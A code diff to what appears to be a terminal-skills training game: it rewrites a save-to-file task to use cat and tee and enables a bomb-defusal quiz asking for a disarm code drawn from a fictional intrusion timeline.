                 },
                 {
                     id: 6,
-                    task: 'Generate a summary report (save to file)',
-                    hint: 'Use redirection > or tee: ... > report.txt',
+                    task: 'Generate final mission report with the disarm code',
+                    hint: 'Combine and save: cat mission_summary.txt | tee final_report.txt',
                     check: (cmd, state, output) => {
                         return cmd.includes('>') || cmd.includes('tee');
                     }
                 }
             ],
 
+            // Bomb defusal insight phase - FINAL BOSS
             insightPhase: {
-                enabled: false
+                enabled: true,
+                question: "FINAL DISARM SEQUENCE. Your complete incident analysis revealed the master code. The bomb's failsafe requires a 4-digit code derived from your investigation. What is the disarm code?",
+                options: [
+                    { text: "1105 - From the attacker IP 192.168.1.105", correct: false },
+                    { text: "0230 - Timestamp when root access was gained (02:30:00)", correct: true },
+                    { text: "4460 - Port number pattern from the attack", correct: false },
+                    { text: "1234 - The sshd process ID pattern", correct: false }
+                ]
             }
         },
 
